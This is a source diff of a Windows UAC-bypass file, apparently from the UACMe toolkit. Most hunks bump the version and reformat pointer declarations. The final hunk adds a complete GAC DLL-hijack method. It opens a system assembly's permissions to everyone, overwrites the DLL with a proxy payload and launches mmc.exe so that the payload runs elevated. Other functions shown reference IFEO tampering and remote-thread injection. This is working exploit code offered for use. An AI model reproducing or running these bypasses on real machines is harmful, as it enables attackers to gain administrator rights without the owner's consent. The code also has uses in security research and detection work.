@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.24
+*  VERSION:     3.27
 *
-*  DATE:        20 Apr 2020
+*  DATE:        11 Sep 2020
 *
 *  Hybrid UAC bypass methods.
 *
@@ -91,7 +91,7 @@ NTSTATUS ucmAvrfMethod(
         // Set new key security DACL.
         // Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
         //
-        if (!ucmMasqueradedAlterObjectSecurityCOM(
+        if (!ucmMasqueradedSetObjectSecurityCOM(
             T_IFEO,
             DACL_SECURITY_INFORMATION,
             SE_REGISTRY_KEY,
@@ -204,7 +204,7 @@ NTSTATUS ucmWinSATMethod(
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     BOOL bCopyResult = FALSE;
-    CABDATA *Cabinet = NULL;
+    CABDATA* Cabinet = NULL;
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szBuffer[MAX_PATH * 2];
@@ -467,7 +467,7 @@ BOOL ucmSirefefMethodCleanup(
 *
 */
 DWORD WINAPI ucmxElevatedLaunchProc(
-    _In_ LOAD_PARAMETERS *Params
+    _In_ LOAD_PARAMETERS* Params
 )
 {
     SHELLEXECUTEINFOW shexec;
@@ -630,8 +630,8 @@ NTSTATUS ucmSirefefMethod(
             break;
         }
 
-        newEp = (char *)RemoteCode + ((char *)LoadProc - (char *)InjectorImageBase);
-        newDp = (char *)RemoteCode + ((char *)LoadParams - (char *)InjectorImageBase);
+        newEp = (char*)RemoteCode + ((char*)LoadProc - (char*)InjectorImageBase);
+        newDp = (char*)RemoteCode + ((char*)LoadParams - (char*)InjectorImageBase);
 
         Status = RtlCreateUserThread(
             hProcess,
@@ -773,7 +773,7 @@ NTSTATUS ucmGWX(
         }
 
         //summon some unicorns, kongouXX.cd expected to be in the same directory as application
-        Ptr = supReadFileToBuffer(KONGOU_CD, &DataSize);
+        Ptr = supReadFileToBuffer_Cur(KONGOU_CD, &DataSize);
         if (Ptr == NULL) {
 #ifdef _DEBUG
             supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_NOT_FOUND);
@@ -1035,7 +1035,7 @@ NTSTATUS ucmAutoElevateManifest(
 *
 */
 BOOL ucmInetMgrFindCallback(
-    _In_ WIN32_FIND_DATA *fdata,
+    _In_ WIN32_FIND_DATA* fdata,
     _In_ LPWSTR lpDirectory,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
@@ -1169,8 +1169,8 @@ BOOL ucmInetMgrFindCallback(
     return bSuccess;
 }
 
-typedef BOOL(CALLBACK *UCMX_FIND_FILE_CALLBACK)(
-    _In_ WIN32_FIND_DATA *fdata,
+typedef BOOL(CALLBACK* UCMX_FIND_FILE_CALLBACK)(
+    _In_ WIN32_FIND_DATA* fdata,
     _In_ LPWSTR lpDirectory,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize);
@@ -1338,7 +1338,7 @@ NTSTATUS ucmSXSMethod(
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
-    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
+    WCHAR* lpszFullDllPath = NULL, * lpszDirectoryName = NULL;
     SIZE_T   sz;
     LPWSTR   lpSxsPath = NULL;
 
@@ -2125,7 +2125,7 @@ NTSTATUS ucmSXSDccwMethod(
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     BOOL     bWusaNeedCleanup = FALSE;
     HMODULE  hGdiPlus = NULL;
-    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
+    WCHAR* lpszFullDllPath = NULL, * lpszDirectoryName = NULL;
     SIZE_T   sz;
     LPWSTR   lpSxsPath = NULL, lpEnd;
 
@@ -2405,7 +2405,7 @@ NTSTATUS ucmFwCplLuaMethod(
     HKEY        hKey = NULL;
     SIZE_T      sz = 0;
 
-    IFwCplLua   *FwCplLua = NULL;
+    IFwCplLua* FwCplLua = NULL;
 
     WCHAR       szKey[MAX_PATH + 1];
 
@@ -2569,8 +2569,8 @@ NTSTATUS ucmDccwCOMMethod(
 
     SIZE_T           sz = 0;
 
-    ICMLuaUtil      *CMLuaUtil = NULL;
-    IColorDataProxy *ColorDataProxy = NULL;
+    ICMLuaUtil* CMLuaUtil = NULL;
+    IColorDataProxy* ColorDataProxy = NULL;
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
@@ -2813,7 +2813,7 @@ NTSTATUS ucmCOMHandlersMethod2(
     DWORD cbData = 0;
     LRESULT lResult;
 
-    WCHAR *s, *d;
+    WCHAR* s, * d;
 
     HKEY SourceKey = NULL, DestKey = NULL;
 
@@ -3079,7 +3079,7 @@ NTSTATUS ucmCOMHandlersMethod2(
 *
 */
 BOOL ucmxSetResetW32TimeSvcParams(
-    _In_ ISLLUACOM *SPLuaObject,
+    _In_ ISLLUACOM* SPLuaObject,
     _In_opt_ LPWSTR lpServiceDll,
     _In_ BOOL Set
 )
@@ -3295,8 +3295,8 @@ NTSTATUS ucmDateTimeStateWriterMethod(
     ULONG                   I, svcstate;
     HRESULT                 hr, hr_init;
     HANDLE                  hSvcStopEvent = NULL;
-    IDateTimeStateWriter   *Dtsw = NULL;
-    ISLLUACOM              *SPLuaObject = NULL;
+    IDateTimeStateWriter* Dtsw = NULL;
+    ISLLUACOM* SPLuaObject = NULL;
 
     UNICODE_STRING          usSignalEvent = RTL_CONSTANT_STRING(SIGNAL_OBJECT);
 
@@ -3473,7 +3473,7 @@ NTSTATUS ucmAcCplAdminMethod(
     NTSTATUS                MethodResult = STATUS_ACCESS_DENIED;
 
     BOOL                    bValueSet = FALSE;
-    IAccessibilityCplAdmin *AdminElevate = NULL;
+    IAccessibilityCplAdmin* AdminElevate = NULL;
     HRESULT                 hr = E_FAIL, hr_init;
     HKEY                    hKey = NULL;
     DWORD                   cbData = 0, dwDisposition = 0;
@@ -3608,6 +3608,137 @@ NTSTATUS ucmEgre55Method(
 
     if (pTmp) CoTaskMemFree((LPVOID)pTmp);
     if (lpDest) supHeapFree(lpDest);
+
+    return MethodResult;
+}
+
+/*
+* ucmGACPoisonMethod
+*
+* Purpose:
+*
+* Bypass UAC by by Dll hijack of GAC.
+* Original author link: https://github.com/AzAgarampur/byeintegrity-uac
+*
+*/
+NTSTATUS ucmGACPoisonMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    WCHAR szFileName[MAX_PATH * 2];
+    WCHAR szTargetProc[MAX_PATH * 2];
+    DWORD origSize = 0, bytesIO;
+    PBYTE origFileBuffer = NULL;
+
+    HANDLE hFile;
+
+    LPWSTR oldSecurity = NULL;
+
+    do {
+
+        //
+        // Run NET maintenance tasks.
+        //
+        _strcpy(szFileName, g_ctx->szSystemDirectory);
+        _strcat(szFileName, MSCHEDEXE_EXE);
+        if (!supRunProcess2(szFileName, TEXT("Start"), NULL, SW_HIDE, TRUE))
+            break;
+
+        //
+        // Read existing file to memory.
+        //
+        _strcpy(szFileName, g_ctx->szSystemRoot);
+        _strcat(szFileName, TEXT("assembly\\NativeImages_v4.0.30319_64\\Accessibility\\"));
+        _strcat(szFileName, TEXT("c271faaf45757aaa92c5fe9622895485\\")); //FIXME
+        _strcat(szFileName, ACCESSIBILITY_NI_DLL);
+
+        origFileBuffer = supReadFileToBuffer(szFileName, &origSize);
+        if (origFileBuffer == NULL)
+            break;
+
+        //
+        // Remember old file security permissions.
+        //
+        oldSecurity = NULL;
+        if (!ucmMasqueradedGetObjectSecurityCOM(szFileName,
+            DACL_SECURITY_INFORMATION,
+            SE_FILE_OBJECT,
+            &oldSecurity))
+        {
+            break;
+        }
+
+        //
+        // Reset target file permissions.
+        //
+        if (!ucmMasqueradedSetObjectSecurityCOM(szFileName,
+            DACL_SECURITY_INFORMATION,
+            SE_FILE_OBJECT,
+            T_SDDL_ALL_FOR_EVERYONE))
+        {
+            break;
+        }
+
+        //
+        // Overwrite file with Fubuki.
+        //
+        hFile = CreateFile(szFileName,
+            GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            0,
+            NULL);
+
+        if (hFile != INVALID_HANDLE_VALUE) {
+            WriteFile(hFile, ProxyDll, ProxyDllSize, &bytesIO, NULL);
+            SetEndOfFile(hFile);
+            CloseHandle(hFile);
+        }
+
+        //
+        // Run target.
+        //
+        _strcpy(szTargetProc, g_ctx->szSystemDirectory);
+        _strcat(szTargetProc, MMC_EXE);
+        if (supRunProcess2(szTargetProc, TEXT("wf.msc"), NULL, SW_SHOW, TRUE))
+            MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
+
+    //
+    // Restore original file contents and permissions.
+    //
+    if (origFileBuffer) {
+
+        hFile = CreateFile(szFileName,
+            GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            0,
+            NULL);
+
+        if (hFile != INVALID_HANDLE_VALUE) {
+            WriteFile(hFile, origFileBuffer, origSize, &bytesIO, NULL);
+            SetEndOfFile(hFile);
+            CloseHandle(hFile);
+        }
+
+        supVirtualFree(origFileBuffer, NULL);
+
+        if (oldSecurity) {
+
+            ucmMasqueradedSetObjectSecurityCOM(szFileName,
+                DACL_SECURITY_INFORMATION,
+                SE_FILE_OBJECT,
+                oldSecurity);
+
+            CoTaskMemFree(oldSecurity);
+        }
+    }
 
     return MethodResult;
 }
